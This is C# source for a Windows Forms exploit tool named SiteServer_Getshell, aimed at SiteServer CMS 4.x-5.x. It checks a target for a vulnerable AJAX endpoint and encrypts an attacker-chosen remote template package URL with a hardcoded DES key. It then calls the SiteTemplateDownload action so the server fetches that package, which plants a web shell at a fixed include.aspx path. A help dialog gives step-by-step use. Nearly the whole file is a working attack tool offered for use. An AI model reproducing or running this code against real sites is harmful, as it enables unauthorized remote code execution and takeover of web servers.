using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
using WHC.OrderWater.Commons;
using System.Threading;

namespace SiteServer_Getshell
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private string _RemotePackage;
        private string _Target;
        private readonly string _Key = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        private static readonly string AppPath = Application.StartupPath;
        private static readonly string _VulPath = "/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl={0}&directoryName=1nclude";
        HttpHelper httpHelper = new HttpHelper();

        /// <summary>
        /// 编码Payload
        /// </summary>
        /// <param name="_inputString">明文Payload</param>
        /// <returns>编码后的Payload</returns>
        private string Payload_Encode(string _inputString)
        {
            string _outString;
            byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
            var byKey = Encoding.UTF8.GetBytes(_Key.Length > 8 ? _Key.Substring(0, 8) : _Key);
            var des = new DESCryptoServiceProvider();
            var inputByteArray = Encoding.UTF8.GetBytes(_inputString);
            var ms = new MemoryStream();
            var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write); cs.Write(inputByteArray, 0, inputByteArray.Length);
            cs.FlushFinalBlock();
            _outString = Convert.ToBase64String(ms.ToArray());
            _outString = _outString.Replace("+", "0add0").Replace("=", "0equals0").Replace("&", "0and0").Replace("?", "0question0").Replace("/", "0slash0");
            return _outString;
        }

        /// <summary>
        /// 解码Payload
        /// </summary>
        /// <param name="_EnPayload">编码的Payload</param>
        /// <returns>明文Payload</returns>
        private string Payload_Decode(string _EnPayload)
        {
            string _inputString;
            string _outString;
            _inputString = _EnPayload.Replace("0add0", "+").Replace("0equals0", "=").Replace("0and0", "&").Replace("0question0", "?").Replace("0slash0", "/");
            byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
            var byKey = Encoding.UTF8.GetBytes(_Key.Substring(0, 8));
            var des = new DESCryptoServiceProvider();
            var inputByteArray = Convert.FromBase64String(_inputString);
            var ms = new MemoryStream();
            var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write);
            cs.Write(inputByteArray, 0, inputByteArray.Length);
            cs.FlushFinalBlock();
            Encoding encoding = new UTF8Encoding();
            _outString = encoding.GetString(ms.ToArray());
            return _outString;
        }

        /// <summary>
        /// 检测是否存在漏洞
        /// </summary>
        /// <param name="_Target">目标地址</param>
        /// <returns>true:存在false:不存在</returns>
        private bool Check_Vul(string _Target)
        {
            string _Url = _Target + @"/SiteServer/Ajax/ajaxOtherService.aspx";
            if (httpHelper.GetHtml(_Url).Contains("{}"))
            {
                return true;
            }
            return false;
        }

        private void Check_Callback(string str) {
            if (Log_TextBox.InvokeRequired)
            {
                // 当一个控件的InvokeRequired属性值为真时，说明有一个创建它以外的线程想访问它
                Action<string> actionDelegate = (x) => { this.Log_TextBox.AppendText(x); };
                // 或者
                // Action<string> actionDelegate = delegate(string txt) { this.label2.Text = txt; };
                this.Log_TextBox.Invoke(actionDelegate,str);
            }
        }
        private void Check_Ava() {
            _RemotePackage = RemotePackage_TextBox.Text.Trim();
            Check_Callback(DateTime.Now.ToString()+" 检测线程启动......\r\n");
            if (httpHelper.GetUrlError(_RemotePackage) == 200)
            {
                PayloadStatus_PicBox.ImageLocation = AppPath + "/images/ok.png";
                Check_Callback(DateTime.Now.ToString() + " 模板包状态正常 ! \r\n");
                return;
            }
            PayloadStatus_PicBox.ImageLocation = AppPath + "/images/no.png";
            Check_Callback(DateTime.Now.ToString() + " 模板包不可用 ！\r\n");
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Help_PicBox.ImageLocation = AppPath + "/images/help.ico";
        }

        private void Exp_Btn_Click(object sender, EventArgs e)
        {
            string _html;
            string _ExpUrl;
            _Target = Target_TextBox.Text.Trim();
            _RemotePackage = RemotePackage_TextBox.Text.Trim();
            try
            {
                //检测是否存在漏洞
                if (!Check_Vul(_Target))
                {
                    MessageBox.Show("Target does not exist vulnerability ！", "Warning",MessageBoxButtons.OK,MessageBoxIcon.Warning);
                    return;
                }
                Log_TextBox.AppendText(" Target exist vulnerability !\r\n");
                //转换URL
                _ExpUrl = _Target + string.Format(_VulPath, Payload_Encode(_RemotePackage));
                _html = httpHelper.GetHtml(_ExpUrl);
                //判断写入
                if (_html.Contains("站点模板下载成功，请到站点模板管理中查看。"))
                {
                    Log_TextBox.AppendText("Exploit Success!\r\n");
                    Log_TextBox.AppendText("Please visit:\r\n" + _Target + "/SiteFiles/SiteTemplates/1nclude/include.aspx\r\n");
                    return;
                }
                Log_TextBox.AppendText("Exploit failed !\r\n");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //检测模板包是否可用
        private void Detect_Btn_Click(object sender, EventArgs e)
        {
            Log_TextBox.Clear();
            Thread CheckAva;
            CheckAva = new Thread(new ThreadStart(Check_Ava));
            CheckAva.Start();
        }

        private void Encode_Btn_Click(object sender, EventArgs e)
        {
            Decode_TextBox.Text = Payload_Encode(Encode_TextBox.Text.Trim());
        }

        private void Decode_Btn_Click(object sender, EventArgs e)
        {
            Encode_TextBox.Text = Payload_Decode(Decode_TextBox.Text.Trim());
        }

        private void Help_PicBox_Click(object sender, EventArgs e)
        {
            string _Message = "---SiteServer4.x-5.x RTD Using Manual---\r\n"
                                + "Step 1:\r\n(Optional)Input your remote template package URL and click the \"Detect\" button to detect your package status! \r\n"
                                + "Step 2:\r\nInput your attack or test target and then click the \"Exploit\" Button\r\n"
                                + "Note:\r\nYou can change the Payload Package name But the shell name must be \"include.aspx\"\r\n";
            MessageBox.Show(_Message, "Using Manual",MessageBoxButtons.OK,MessageBoxIcon.None);
        }
    }
}
